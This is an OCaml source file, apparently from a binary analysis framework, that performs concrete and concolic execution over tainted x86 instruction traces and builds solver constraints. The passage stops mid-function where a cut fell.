(* A module to perform trace analysis *)

open Symbeval
open Type
open Ast

module D = Debug.Make(struct let name = "TraceEval" and default=`NoDebug end)
open D

(** So here's how we will do partial symbolic execution on
    traces: 
    1. A trace is a list of AST stmts as executed by the
    program
    2. Execute the trace and at each instruction:
    
    a) check if it is a taint introduction stmt
    b) if it is, update the memory context with the symbolic
    variables
    c) If it a regular stmt, read the new concrete values and
    taint flags and store them in a map
    d) whenever the symbolic evaluator requests a value that is
    known and untainted, provide it with the value from the map
      - if it is tainted let the evaluator worry about it

*)

(** Optional consistency check between trace and bap evaluation.
    Tainted values should always be equal in the BAP evaluation and the
    trace.  Non-tainted values do not have to match, since their values
    are assumed to be constant. *)
let consistency_check = ref false;;
let use_alt_assignment = ref true;;

(* Concretizing as much as possible *)
let allow_symbolic_indices = ref false

let full_symbolic = ref true
  
let padding = ref false
  

(*************************************************************)
(**********************  Datastructures  *********************)
(*************************************************************)

(* The datastructures that are be used during trace analysis *)

(* A type for all concrete values *)
type value = 
{
  exp   : Ast.exp;
  usg   : usage;
  tnt   : bool;
}

type environment =
{
  vars:     (string,value)  Hashtbl.t;
  memory:   (int64,value)   Hashtbl.t;
  symbolic: (int64,Ast.exp) Hashtbl.t;
}

(* A global environment to keep the concrete and taint 
   information of the statement block that is analyzed *)
let global = 
  {
  vars     = Hashtbl.create 10;
  memory   = Hashtbl.create 10;
  symbolic = Hashtbl.create 10;
}

(* Some wrappers to interface with the above datastructures *)

(** Create a lookup for our variables *)
let gamma = Asmir.gamma_create Asmir.x86_mem Asmir.x86_regs

(** Convert name of a register to a var for that register *)
let name_to_var name =
  try
    Some(Asmir.gamma_lookup gamma name)
  with Failure _ ->
    wprintf "Did not find %s in gamma" name;
    None
      

let var_lookup v = try Some(Hashtbl.find global.vars v) with Not_found -> None
let mem_lookup i = try Some(Hashtbl.find global.memory i) with Not_found -> None

(** This is a map from DSA variable names to standard variable names. *)
let dsa_rev_map = ref None

(** Convert a DSA var to a normal var *)
let dsa_var dv =
  match !dsa_rev_map with
  | Some(map) ->
      (try Some(VH.find map dv)
       with Not_found -> None)
  | None -> Some(dv)

(** Get original variable name from DSA var *)
let dsa_orig_name dv =
  match dsa_var dv with
  | Some(x) -> Some(Var.name x)
  | None -> None

(** Looks for concrete value information by a DSA name *)
let dsa_var_lookup dv =
  match dsa_var dv with
  | Some(v) -> 
      var_lookup (Var.name v)
  | None -> None 

let concrete_val name = match (var_lookup name) with
  | Some(e) -> Some(e.exp)
  | None -> None
let dsa_concrete_val dv = match dsa_var_lookup dv with
  | Some(e) -> Some(e.exp)
  | None -> None
let concrete_mem index = match (mem_lookup index) with
  | Some(e) -> Some(e.exp)
  | None -> None
let symbolic_mem = Hashtbl.find global.symbolic

let taint_val name = match (var_lookup name) with
  | Some(x) -> Some(x.tnt)
  | None -> None
let dsa_taint_val dv = match (dsa_var_lookup dv) with
  | Some(x) -> Some(x.tnt)
  | None -> None
let taint_mem index = match (mem_lookup index) with
  | Some(x) -> Some(x.tnt)
  | None -> None

let bound = Hashtbl.mem global.vars
let in_memory = Hashtbl.mem global.memory

let add_var var value usage taint = 
  Hashtbl.replace global.vars var 
    {exp=value;
     usg=usage;
     tnt=taint;}
let add_mem index value usage taint =
  Hashtbl.add global.memory index 
    {exp=value;
     usg=usage;
     tnt=taint;}
let add_symbolic = Hashtbl.replace global.symbolic
  
let add_new_var var value usage taint = 
(*  if not (bound var) then *)
    add_var var value usage taint

let del_var var =
  while Hashtbl.mem global.vars var do
    Hashtbl.remove global.vars var
  done

let dsa_del_var dv =
  match dsa_var dv with
  | Some(v) -> del_var (Var.name v)
  | None -> ()

let del_mem index =
  while Hashtbl.mem global.memory index do
    Hashtbl.remove global.memory index
  done

let del_symbolic = Hashtbl.remove global.symbolic

let cleanup () =
  Hashtbl.clear global.vars;
  Hashtbl.clear global.memory

let conc_mem_fold f = 
  Hashtbl.fold f global.memory
let conc_mem_iter f = 
  Hashtbl.iter f global.memory


(*************************************************************)
(*********************  Helper Functions  ********************)
(*************************************************************)

(** Keep track of registers not always updated in BAP.  *)
let badregs = Hashtbl.create 32
let () =
  List.iter (fun r -> Hashtbl.add badregs r ())
    ("EFLAGS"
     ::"R_FS"
     ::"R_LDT"
     ::"R_GDT"
     ::"R_AF"
     ::"R_CC_OP"
     ::"R_CC_DEP1"
     ::"R_CC_DEP2"
     ::"R_CC_NDEP"
     ::[])
    
let isbad v = Hashtbl.mem badregs (Var.name v)

let print_vars () =
  let printone k v = dprintf "Info for register %s %s" k (Pp.ast_exp_to_string v.exp) in
  Hashtbl.iter printone global.vars
    
(** Build a statement asserting that each operand is equal to its value in the trace

    @param h Mapping of vars to dsa vars
 *)
let assert_vars h =
  let addone k v a = 
    match name_to_var k with
    | Some(realv) -> 
	(match taint_val (Var.name realv) with 
	| Some(true) ->
	    if not (isbad realv) then (
	      if VH.mem h realv then 
		let eq = BinOp(EQ, Var(realv), v.exp) in
		BinOp(AND, eq, a)
	      else a) else a
	| _ -> a)
    | None -> a
  in
  let bige = Hashtbl.fold addone global.vars exp_true in
  Assert(bige, [])

(** Build statements assigning operands

    @param h Mapping of vars to dsa vars
 *)
let assign_vars () =
  let addone k v a = 
    match name_to_var k with
    | Some(realv) -> 
	(match taint_val (Var.name realv) with 
	 | Some(false) ->
	     (try 
	       Move(realv, v.exp, [])::a
	     with Not_found -> a)
	 | _ -> a)
    | None -> a
  in
  let bige = Hashtbl.fold addone global.vars [] in
  bige


(** Get the expression for a symbolic value *)
let symbtoexp = function
  | Symbolic e -> e
  | _ -> failwith "Not a symbolic expression"
  
(* The number of bytes needed to represent each type *) 
let typ_to_bytes = function 
  | Reg 1 | Reg 8 -> 1
  | Reg 16 -> 2
   | Reg 32 -> 4
  | Reg 64 -> 8
  | _ -> failwith "not a register" 

(* Get the ith byte of a value v *)
let get_byte i v = 
  Int64.logand (Int64.shift_right v ((i-1)*8)) 0xffL 

let num_to_bit num =
  if num > Int64.zero then Int64.one else Int64.zero

(* Wrappers & Useful shorthands to manipulate taint 
   attributes and process taint info *)
let keep_taint = function 
  | Context _ -> true 
  | _ -> false 
      
let unwrap_taint = function 
  | Context c -> c 
  | _ -> failwith "trying to unwrap a non-taint attribute"
      
(* Keeping only the attributes that contain taint info *)
let filter_taint atts = 
  let atts = List.filter keep_taint atts in
    List.map unwrap_taint atts     

let get_int = function
  | Int(v, t) -> let (i,_) = Arithmetic.to_val t v in
    i
  | _ -> failwith "Expected integer"

let taint_to_bool n = n != 0

let hd_tl = function
  | [] -> failwith "empty list"
  | x::xs -> x, xs

let is_mem (Var.V(_,var,t)) =
  (String.length var >= 3) &&
    (String.sub var 0 3 = "mem") &&
  (match t with
  | TMem _
  | Array _ -> true
  | Reg _ -> false)

let is_temp var = 
  (String.length var > 2) &&
    (String.sub var 0 2 = "T_")

let is_symbolic (Var.V(_,s,_)) =
  try
    String.sub s 0 5 = "symb_"
  with _ -> false

(** remove temporaries from delta *)
let clean_delta delta =
  let clean_var v _ =
    if is_temp (Var.name v) then
      VH.remove delta v
  in
  VH.iter clean_var delta

(* This is a total HACK due to VEX's handling of the direction flag *)
let direction_flag eflags = 
  match num_to_bit (Int64.logand eflags 0x400L) with
    | 0L -> 1L
    | _ -> 0xFFFFFFFFL

(* Unfortunately we need to special-case the EFLAGS registers
   since PIN does not provide us with separate registers for 
   the zero, carry etc flags *)
let add_eflags eflags usage taint =
  add_var 
    "R_AF" 
    (Int(num_to_bit (Int64.logand eflags 0x10L), reg_1))
    usage
    taint;
  add_var 
    "R_CF" 
    (Int(num_to_bit (Int64.logand eflags 0x01L), reg_1))
    usage
    taint;
  add_var 
    "R_ZF" 
    (Int(num_to_bit (Int64.logand eflags 0x40L), reg_1))
    usage
    taint;
  add_var 
    "R_SF" 
    (Int(num_to_bit (Int64.logand eflags 0x80L), reg_1))
    usage
    taint;
  add_var
    "R_DFLAG"
    (Int(direction_flag eflags, reg_32))
    usage
    false;
  add_var
    "R_OF"
    (Int(num_to_bit (Int64.logand eflags 0x800L), reg_1))
    usage
    taint;
  add_var
    "R_PF"
    (Int(num_to_bit (Int64.logand eflags 0x4L), reg_1))
    usage
    taint
    
 (* TODO: handle more EFLAGS registers *)

(********************************************************)
(*  REG MAPPING: TODO -> move this in a separate file   *)
(********************************************************)

let regs = Hashtbl.create 32
let () = 
  List.iter (fun (k,v) -> Hashtbl.add regs k v) 
    [
      ("R_AL",("R_EAX",0,reg_32));
      ("R_BL",("R_EBX",0,reg_32));
      ("R_CL",("R_ECX",0,reg_32));
      ("R_DL",("R_EDX",0,reg_32));

      ("R_AH",("R_EAX",8,reg_32));
      ("R_BH",("R_EBX",8,reg_32));
      ("R_CH",("R_ECX",8,reg_32));
      ("R_DH",("R_EDX",8,reg_32));

      ("R_AX",("R_EAX",0,reg_32));
      ("R_BX",("R_EBX",0,reg_32));
      ("R_CX",("R_ECX",0,reg_32));
      ("R_DX",("R_EDX",0,reg_32));
      ("R_BP",("R_EBP",0,reg_32));
      ("R_SI",("R_ESI",0,reg_32));
      ("R_DI",("R_EDI",0,reg_32));
      ("R_SP",("R_ESP",0,reg_32));
    ]

(********************************************************)
	  
(* Store the concrete taint info in the global environment *)
let add_to_conc {name=name; mem=mem; index=index; value=value; 
		 t=typ; usage=usage; taint=Taint taint} =
  (* Stores the concrete (known) memory bytes in the global 
     environment in little endian order *)
  let add_to_mem index value taint limit = 
    let rec add_mem_aux index = function
      | 0 -> 
	  ()
      | n -> 
	  let byte = get_byte (limit-n+1) value in
            if not (in_memory index) then
	      add_mem index (Int(byte,reg_8)) usage taint ;
            add_mem_aux (Int64.succ index) (n-1)
    in
      add_mem_aux index
  in
  let taint = taint_to_bool taint in 
    if mem then
      let limit = typ_to_bytes typ in
	add_to_mem index value taint limit limit 
    else
      (* assert (Hashtbl.mem concrete name = false) ; *)
      let fullname, shift, typ = 
	try Hashtbl.find regs name
	with Not_found -> (name, 0,typ)
      in
      let bits = Arithmetic.to64 (Int64.shift_left value shift,typ) in
      let fullvalue = Int(bits,typ) in
	(add_new_var fullname fullvalue usage taint ;
	 
	 (* Special case EFLAGS *)
	 if name = "EFLAGS" then add_eflags value usage taint)
	
(* Updating the lookup tables with the concrete values *)
let update_concrete s =
  match s with
  | Label (_,atts) ->
      let conc_atts = filter_taint atts in
        if conc_atts != [] then (
	  cleanup ();
          List.iter add_to_conc conc_atts;
	  true
	) else false
  | _ -> false

(** Get the address of the next instruction in the trace *)
let rec get_next_address = function
  | [] -> raise Not_found
  | (Ast.Label ((Addr n),_))::_ -> 
      Name ("pc_"^(Int64.format "0x%Lx" n))
  | _::xs -> get_next_address xs     

(* Converts an address to a string label *)
let to_label = function
  | Addr n -> Name ("pc_"^(Int64.format "0x%Lx" n))
  | other -> other

(** Fetching the first stmt with attributes containing taint info *)
let rec get_first_atts = function
  | [] -> failwith "no taint analysis info were found in the trace"
  | (Ast.Label (_,atts))::rest ->
      let taint_atts = filter_taint atts in
	if taint_atts <> [] then (taint_atts, rest)
	else get_first_atts rest
  | s::rest -> 
      get_first_atts rest 
      
(** Initializing the trace contexts *)
let init_trace trace ctx = 
  let atts,_ = get_first_atts trace in
    (* Create a memory to place the initial symbols *)
  List.iter
    (fun {index=index; taint=Taint taint} ->
       let varname = "symb_"^(string_of_int taint) in
       let newvar = Var (Var.newvar varname reg_8) in
	 add_symbolic index newvar
    ) atts;
    pdebug "Added the initial symbolic seeds" 
 
(** Removing all jumps from the trace *)
let remove_jumps =
  let no_jmps = function 
    | Ast.Jmp _ -> false 
    | _ -> true
  in
    List.filter no_jmps

(** Removing all specials from the traces *)	
let remove_specials =
  let no_specials = function 
    | Ast.Special _ -> false 
    | _ -> true
  in
    List.filter no_specials
   
(* Appends a Halt instruction to the end of the trace *)
let append_halt trace = 
  let halt = Ast.Halt (exp_true, []) in
    Util.fast_append trace [halt]
      
(** A trace is a sequence of instructions. This function
    takes a list of ast statements and returns a list of
    lists of ast stmts. Each one of those sublists will 
    represent the IL of the executed assembly instruction *)
let trace_to_blocks trace = 
  let rec to_blocks blocks current = function
    | [] -> 
	List.rev ((List.rev current)::blocks)
    | (Ast.Label (Addr _, _) as l)::rest ->
	let block = List.rev current in
	to_blocks (block::blocks) [l] rest
    | x::rest ->
	to_blocks blocks (x::current) rest
  in
  let blocks = to_blocks [] [] trace in
    List.filter (fun b -> List.length b > 1) blocks

(** Strips the last jump of the block *)
let strip_jmp block =
  match List.rev block with
	 | (Ast.Jmp _)::rest -> List.rev rest
	 | _ -> block

(*************************************************************)
(*************************  Printers  ************************)
(*************************************************************)

let print = Printf.printf
	     
let print_block =
  List.iter (fun s -> pdebug (Pp.ast_stmt_to_string s))

let trace_length trace = 
  print "Trace length: %d\n" (List.length trace) ;
  trace

let print_formula file formula =
  let oc = open_out file in
  let m2a = new Memory2array.memory2array_visitor () in
  let formula = Ast_visitor.exp_accept m2a formula in
  let foralls = List.map (Ast_visitor.rvar_accept m2a) [] in
  let p = new Stp.pp_oc oc in
  let () = p#assert_ast_exp_with_foralls foralls formula in
  let () = p#counterexample () in
    p#close

module Status = Util.StatusPrinter

(*************************************************************)
(********************  Concrete Execution  *******************)
(*************************************************************)

module TaintConcrete = 
struct 
  let lookup_var delta var = 

    dprintf "looking up %s (concrete)" (Var.name var);

    (* print_vars (); *)

    match dsa_concrete_val var with
    | Some(traceval) ->	
    
    (* First, look up in the trace. 

       Also, we should update delta.
    *)
	VH.replace delta var (Symbolic(traceval));
	Symbolic(traceval)

    | None ->
	
	(* If we can't find it there, then check in delta. Maybe we
	   updated it (e.g., R_ESP = R_ESP+4) *)
	
	try dprintf "trying delta"; VH.find delta var
	with Not_found ->
	  
	  (* If the variable is memory, it's okay (we'll complain during
	     lookup_mem if we can't find a value). If not, we're in
	     trouble! *)
	  
	  match Var.typ var with
	  | TMem _
	  | Array _ ->
              empty_mem var
	  | Reg _ ->
	      if not (isbad var) then 
		wprintf "Unknown variable during eval: %s" (Var.name var);
              Symbolic(Int(0L, (Var.typ var)))
	      
	  
  let conc2symb = Symbolic.conc2symb
  let normalize = Symbolic.normalize
  let update_mem mu pos value endian = 
    (match mu,pos with
    | ConcreteMem(_), Int(i,t) ->
	del_mem i
    | _ -> failwith "Bad memory for concrete evaluation");
    Symbolic.update_mem mu pos value endian

  let lookup_mem mu index endian = 
    (*pdebug ("index at " ^ (Pp.ast_exp_to_string index)) ;*)
    
    (* Look for the data in mu *)
    match mu, index with
    | ConcreteMem(m,v), Int(i,t) -> (

	(* First, search the trace memory *)
	match concrete_mem i with
	| Some(traceval) ->
	    traceval
	| None -> 

	  (* If that doesn't work, check delta *)

	    try AddrMap.find (normalize i t) m
            with Not_found ->
	      
	      (* Well, this isn't good... Just make something up
		 :( *)
	      wprintf "Unknown memory value during eval: addr %Ld" i;
	      Int(0L, reg_8)
      )              
	
    | _ -> failwith "Concrete evaluation should never have symbolic memories"

  let assign v ev ctx =
    dsa_del_var v;
    Symbolic.assign v ev ctx
end
  
module TraceConcrete = Symbeval.Make(TaintConcrete)(FullSubst)(StdForm)

(** Check all variables in delta to make sure they agree with operands
    loaded from a trace. We should be able to find bugs in BAP and the
    trace code using this. *)
let check_delta state =
  (* let dsa_concrete_val v = concrete_val (Var.name v) in *)
  (* let dsa_taint_val v = taint_val (Var.name v) in *)
  let check_mem cm addr v =
    if v.tnt then (
      let tracebyte = get_int v.exp in
      try
	let evalbyte = get_int (AddrMap.find addr cm) in
	if tracebyte <> evalbyte then wprintf "Consistency error: Tainted memory value (address %Lx, value %Lx) present in trace does not match value %Lx in in concrete evaluator" addr tracebyte evalbyte
      with Not_found -> wprintf "Consistency error: Tainted memory value (address %Lx, value %Lx) present in trace but missing in concrete evaluator" addr tracebyte
    )
  in
  let check_var var evalval =
    match Var.typ var with
    | Reg _ -> (
	let dsavarname = dsa_orig_name var in
	let traceval = dsa_concrete_val var in
	let evalval = symbtoexp evalval in
	let tainted = dsa_taint_val var in
	match dsavarname, traceval, tainted with
	| Some(dsavarname), Some(traceval), Some(tainted) -> 
	    ((*dprintf "Doing check on %s" dsavarname;*)
	     if (traceval <> evalval && tainted && not (Hashtbl.mem badregs (Var.name var))) then 
	       wprintf "Difference between tainted BAP and trace values in previous instruction: %s Trace=%s Eval=%s" (dsavarname) (Pp.ast_exp_to_string traceval) (Pp.ast_exp_to_string evalval)
		 (* If we can't find concrete value, it's probably just a BAP temporary *)
	    )
	| _ -> ( (* probably a temporary *) ))
    | TMem _
    | Array _ -> 
	let cmem = match evalval with
	  | ConcreteMem(cm, _) -> cm
	  | _ -> failwith "Concrete execution only"
	in
	Hashtbl.iter (check_mem cmem) global.memory
      
  in
  VH.iter check_var state.delta

let counter = ref 1

(** Transformations needed for traces. *)
let trace_transform_stmt stmt evalf = 
  let exp = ref exp_true in
  let cvis = object(self)
    inherit Ast_visitor.nop
    method visit_exp = function
      | Load(mem, idx, endian, t) ->
	  let cidx = evalf idx in
	  exp := BinOp(AND, !exp, BinOp(EQ, cidx, idx));
	  `ChangeToAndDoChildren(Load(mem, cidx, endian, t))
      | Store(mem, idx, value, endian, t) ->
	  let cidx = evalf idx in
	  exp := BinOp(AND, !exp, BinOp(EQ, cidx, idx));
	  `ChangeToAndDoChildren(Store(mem, cidx, value, endian, t))
      | _ -> `DoChildren
  end
  in
  (* Concretize memory addresses *)
  let stmt =
    if not !allow_symbolic_indices then
      Ast_visitor.stmt_accept cvis stmt
    else stmt
  in
  let s = Printf.sprintf "Removed: %s" (Pp.ast_stmt_to_string stmt) in
  let com = Ast.Comment(s, []) in
  let s = match stmt with
    | (Ast.CJmp (e,tl,_,atts1)) when (evalf e) = exp_true ->
    	[com; Ast.Assert(e,atts1)]
    | (Ast.CJmp (e,_,fl,atts1)) when (evalf e) = exp_false ->
    	[com; Ast.Assert(UnOp(NOT,e),atts1)]
    | Ast.CJmp _ -> failwith "Evaluation failure!"
    | (Ast.Jmp _) ->
	[com]
    | s -> [s] in
  if not !allow_symbolic_indices && !exp <> exp_true then
    Assert(!exp, []) :: s 
  else
    s
	
(** Running each block separately *)
let run_block state block = 
  let addr, block = hd_tl block in
  pdebug ("Running block: " ^ (string_of_int !counter) ^ " " ^ (Pp.ast_stmt_to_string addr));
  let info, block = hd_tl block in
  counter := !counter + 1 ;
  let _ = ignore(update_concrete info) in
  if !consistency_check then (
    (* remove temps *)
    clean_delta state.delta;
    check_delta state;
    (* TraceConcrete.print_values state.delta; *)
    (* TraceConcrete.print_mem state.delta; *)
  );
  let block = append_halt block in 
  let block = strip_jmp block in
    Status.inc() ;   
    Status.inc() ;
  (*print_block block ;*)
  TraceConcrete.initialize_prog state block ;
  (* If we are performing a consistency check, we should not empty out
  delta. However, if delta grows indefinitely, trace operations become
  slow. *)
  if not !consistency_check then
    TraceConcrete.cleanup_delta state ;
  let init = TraceConcrete.inst_fetch state.sigma state.pc in
  let executed = ref [] in
  let rec eval_block state stmt = 
    pdebug (Pp.ast_stmt_to_string stmt);
    (*    Hashtbl.iter (fun k v -> pdebug (Printf.sprintf "%Lx -> %s" k (Pp.ast_exp_to_string v))) concrete_mem ;*)
    Status.inc();
    let evalf e = match TraceConcrete.eval_expr state.delta e with
      | Symbolic(e) -> e
      | _ -> failwith "Expected symbolic" 
    in
    executed := Util.fast_append (trace_transform_stmt stmt evalf) !executed ; 
    (*print_endline (Pp.ast_stmt_to_string stmt) ;*)
    
	     

    try 
      (match TraceConcrete.eval_stmt state stmt with
	 | [newstate] ->
	     let next = TraceConcrete.inst_fetch newstate.sigma newstate.pc in
	       (*pdebug ("pc: " ^ (Int64.to_string newstate.pc)) ;*)
	       eval_block newstate next
	 | _ -> 
	    failwith "multiple targets..."
      )
    with
	(* Ignore failed assertions -- assuming that we introduced them *)
    | AssertFailed _ as e -> 
	  pdebug "failed assertion";
	  raise e;
	  (* let new_pc = Int64.succ state.pc in *)
	  (* let next = TraceConcrete.inst_fetch state.sigma new_pc in *)
	  (* eval_block {state with pc=new_pc} next *)
  in
    try
      eval_block state init
    with 
      |	Failure s as e -> 
	  pwarn ("block evaluation failed :(\nReason: "^s) ;
	  List.iter (fun s -> pdebug (Pp.ast_stmt_to_string s)) block ;
	  (*if !consistency_check then ( *)
	    raise e
	  (* ) else 
	  ((addr,false)::(info,false)::(List.tl !executed)) *)
      | UnknownLabel ->
	  ((addr)::(info)::List.rev (!executed))
      | Halted _ -> 
	  ((addr)::(info)::List.rev (List.tl !executed))

let run_blocks blocks length =
  counter := 1 ;
  Status.init "Concrete Run" length ;
   let state = TraceConcrete.create_state () in
   let rev_trace = List.fold_left 
    (fun acc block -> 
       (run_block state block)::acc
    ) [] blocks
  in
  Status.stop () ;
  List.flatten (List.rev rev_trace)

(** Convert a trace to DSA form 

    @param p The AST program to convert to DSA form
    @return A tuple of the DSA version of the program and a hash table
    mapping DSA vars to the original vars.

    @note Does not use DSA for 'mem'.
*)
let to_dsa p =
  (* Maps vars to their dsa name *)
  let h = VH.create 1000 in
  let rh = VH.create 1000 in
  (* Maps a dsa name to the original var name.  Needed for when we
     want to lookup concrete values. *)
  let dsa_ctr = ref 0 in
  let new_name (Var.V(_,s,t) as v) = 
    if is_mem v then v else (
      dsa_ctr := !dsa_ctr + 1;
      assert (!dsa_ctr <> 0);
      let s = Printf.sprintf "%sdsa%d" s !dsa_ctr in
      Var.newvar s t
      )
  in
  let replace_var v =
    let newv = new_name v in
    VH.add h v newv;
    VH.add rh newv v;
    newv
  in
  (* Rename all assigned vars *)
  let av = object(self)
    inherit Ast_visitor.nop
    method visit_avar v =
      `ChangeTo (replace_var v)

    method visit_rvar v =
      try
	`ChangeTo (VH.find h v)
      with Not_found ->
	dprintf "Unable to find %s during DSA: probably an input" (Var.name v);
	let nv = replace_var v in
	`ChangeTo nv

    method visit_uvar v =
      VH.remove h v;
      `DoChildren

  end
  in
  (Ast_visitor.prog_accept av p, rh)

(** Convert a stmt to DSA form 

    @param s The AST program to convert to DSA form
    @param h The map from original var names to most recent dsa var
    @param rh The map from a dsa var back to the original var
    @return The DSA'ified statement

    @note Does not use DSA for 'mem'.
*)
let to_dsa_stmt s h rh =
  let dsa_ctr = ref 0 in
  let new_name (Var.V(_,s,t) as v) = 
    if is_mem v then v else (
      dsa_ctr := !dsa_ctr + 1;
      assert (!dsa_ctr <> 0);
      let s = Printf.sprintf "%sdsa%d" s !dsa_ctr in
      Var.newvar s t
      )
  in
  let replace_var v =
    let newv = new_name v in
    VH.add h v newv;
    VH.add rh newv v;
    newv
  in
  (* Rename all assigned vars *)
  let av = object(self)
    inherit Ast_visitor.nop
    method visit_avar v =
      `ChangeTo (replace_var v)

    method visit_rvar v =
      try
	`ChangeTo (VH.find h v)
      with Not_found ->
	dprintf "Unable to find %s during DSA: probably an input" (Var.name v);
	let nv = replace_var v in
	`ChangeTo nv

    method visit_uvar v =
      VH.remove h v;
      `DoChildren

  end
  in
  Ast_visitor.stmt_accept av s


(** Perform concolic execution on the trace and
    output a set of constraints *)
let concrete trace = 
  dsa_rev_map := None;
  let trace = Memory2array.coerce_prog trace in
  (* let trace,rh = to_dsa trace in *)
  (* (\* Set the reverse lookup into place so dsa_lookup_var can map to original vars/names *\) *)
  (* dsa_rev_map := rh; *)
  let no_specials = remove_specials trace in
  let blocks = trace_to_blocks no_specials in
  (*pdebug ("blocks: " ^ (string_of_int (List.length blocks)));*)
  let length = List.length no_specials in
  
  let actual_trace = run_blocks blocks length in
    actual_trace

(*************************************************************)
(********************  Concolic Execution  *******************)
(*************************************************************)

(* Assumptions for the concretization process to be sound:
   - We can have at most one memory load/store on each 
   asm instruction
   - We are doing the lookups/stores in little-endian order
*)

(* A quick and dirty way to estimate the formula size *)
let formula_size formula =
  let _max n1 n2 = if n1 > n2 then n1 else n2 in
  let (+) = Int64.add in
  let rec size = function
    | Ast.BinOp(_,e1,e2) -> Int64.one + (size e1) + (size e2)
    | Ast.UnOp(_,e) -> Int64.one + size e
    | Ast.Var _ -> Int64.one
    | Ast.Lab _ -> Int64.one
    | Ast.Int (n,_) -> Int64.one
    | Ast.Cast (_, _, e) -> Int64.one + size e
    | Ast.Unknown _ -> Int64.one
    | Ast.Load (ea, ei,  _, _) -> Int64.one + (size ea) + (size ei)
    | Ast.Store (ea, ei, ev, _, _) -> Int64.one + (size ea) + (size ei) + (size ev)
    | Ast.Let (_, el, eb) -> Int64.one + (size el) + (size eb)
  in
    size formula

module IntSet = Set.Make(Int64)
let memory_read = ref IntSet.empty
let memory_write = ref IntSet.empty
let empty_mem_ind () = 
  memory_read  := IntSet.empty; 
  memory_write := IntSet.empty
  
let get_indices () = 
  empty_mem_ind () ;
  conc_mem_iter 
    (fun index value -> match value.usg with
       | RD -> memory_read := IntSet.add index !memory_read
       | WR -> memory_write := IntSet.add index !memory_write
       | RW -> (* Read-Write -> let's store both *)
	   memory_read := IntSet.add index !memory_read ;
	   memory_write := IntSet.add index !memory_write
    )

let get_concrete_read_index () =
  let el = IntSet.max_elt !memory_read in
    memory_read := IntSet.remove el !memory_read ;
    Int(el, reg_32)

let get_concrete_write_index () =
  let el = IntSet.max_elt !memory_write in
    memory_write := IntSet.remove el !memory_write ;
    Int(el, reg_32)


module LetBind =
struct
(*
  module Expression = 
  struct 
    type t = Ast.exp
    let equal = (==)
    let hash = Hashtbl.hash
  end

  module ExpHash = Hashtbl.Make(Expression)
  (* A hashtable to hold the let bindings for several
     different predicates. FIXME: for now it is just a list
     but this should really be changed *)
  let bindings : form list ExpHash.t = ExpHash.create 10
*)  
  type form = And of Ast.exp | Let of (Var.t * Ast.exp)
  let bindings = ref []
    
  let add_to_formula formula expression typ =
    (match expression, typ with
      | _, Equal -> 
	  bindings := (And expression) :: !bindings
      | BinOp(EQ, Var v, value), Rename -> 
	  bindings := (Let (v,value)) :: !bindings
   | _ -> failwith "internal error: adding malformed constraint to formula"
    );
    StdForm.add_to_formula formula expression typ

  let output_formula () =
    let rec create_formula acc = function
      | [] -> acc
      | (And e1)::rest ->
	  let acc = BinOp(AND, e1, acc) in
	    create_formula acc rest
      | (Let (v,e))::rest ->
	  let acc = Ast.Let(v, e, acc) in
	    create_formula acc rest
    in
      create_formula exp_true !bindings
end

module TaintSymbolic = 
struct 

  let lookup_var delta var =

    let name = Var.name var in
    dprintf "looking up var %s" name;

    (* We need to use DSA because we combine the delta context with
       let-based renaming.  If we did not use DSA, then assignments to
       new registers could shadow previous computations.  *)
    TraceConcrete.print_values delta;

    let unknown = !full_symbolic && not (VH.mem delta var) in
      (match dsa_taint_val var, dsa_concrete_val var with
       | Some(true), _ when unknown ->
  	   (* If the variable is tainted and we don't have a formula for it, it is symbolic *)
	   dprintf "symbolic";
  	   Symbolic (Var var)
       | Some(true), _ ->
  	   (* If the variable is tainted, but we do have a formula for it *)
	   dprintf "getting formula from delta: %s" (Var.name var);
  	   VH.find delta var

       | _, _ when is_symbolic var ->
	   (* If the variable is untainted, but is a symbolic byte that we introduced *)
	   Symbolic(Var(var))

       | _, Some(cval) ->
  	   (* Finally, if untainted try to use the concrete value.
  	      Otherwise, see if we can find the value in delta; it's
  	      probably a temporary. *)
	   dprintf "Using concrete value";
	   if !use_alt_assignment then (
	     (* In the alternate scheme, all concretes are added right to the formula *)
	     VH.remove delta var;
	     Symbolic(Var(var))
	   ) else (
	     VH.remove delta var;
  	     Symbolic(cval)
	   )
       | _, _ ->
	   dprintf "looking up in delta";
  	   try VH.find delta var
  	   with Not_found ->
  	     match Var.typ var with
  	     | TMem _ -> dprintf "new memory %s" (Var.name var); empty_smem var
  	     | _ ->
  		 wprintf "Variable not found during evaluation: %s" name;
  		 Symbolic(Var(var))
		       
      )
	
	
  let conc2symb = Symbolic.conc2symb
  let normalize = Symbolic.normalize
  let update_mem mu pos value endian =
    match is_concrete pos with
    | true ->
	(match pos with
	 | Int (n, _) -> del_symbolic n
	 | _ -> ());
	Symbolic.update_mem mu pos value endian
    | _  ->
	Symbolic.update_mem mu pos value endian
	    
  (* TODO: add a memory initializer *)

  let rec lookup_mem mu index endian = 
    match index with
    | Int(n,_) ->
	(try 
	   (* Check if this is a symbolic seed *)
	   let var = symbolic_mem n in
	   (* pdebug ("introducing symbolic: "^(Pp.ast_exp_to_string var)) ; *)
	   (*update_mem mu index var endian;
	     Hashtbl.remove n;*)
	   var
	 with Not_found ->
	   (* Check if we know something about this memory location *)
	   (*pdebug ("not found in symb_mem "^(Printf.sprintf "%Lx" n)) ;*)
     let tainted = match taint_mem n with
	     | Some(x) -> x
	     | None -> false
	   in
	   if tainted then
	     Symbolic.lookup_mem mu index endian
	   else
	     match concrete_mem n with
	     | Some(x) -> x
	     | None -> failwith "Unable to locate concrete memory operand"
	)
    | _ ->
	  (pdebug ("Symbolic memory index at " 
		   ^ (Pp.ast_exp_to_string index)) ;
	   Symbolic.lookup_mem mu index endian)
	      
  let assign v ev ({delta=delta; pred=pred; pc=pc} as ctx) =
    (* XXX: Make sure to remove concrete value *)

    (* let v = dsa_add_map v in *)

    if !full_symbolic then
      let expr = symb_to_exp ev in
      let is_worth_storing = (*is_concrete expr &&*) 
	is_temp (Var.name v)
      in
      let pred' =
	if is_worth_storing then (context_update delta v ev ; pred)
	else
	  let constr = BinOp (EQ, Var v, expr) in
	  pdebug ((Var.name v) ^ " = " ^ (Pp.ast_exp_to_string expr)) ;
	  VH.remove delta v; (* shouldn't matter because of dsa, but remove any old version anyway *)
	  LetBind.add_to_formula pred constr Rename 
      in
	[{ctx with pred=pred'; pc=Int64.succ pc}]
    else
      Symbolic.assign v ev ctx
end

module TraceSymbolic = Symbeval.Make(TaintSymbolic)(FullSubst)(LetBind)

let is_seed_label = (=) "Read Syscall"
      
let add_symbolic_seeds memv = function
  | Ast.Label (Name s,atts) when is_seed_label s ->
      List.iter
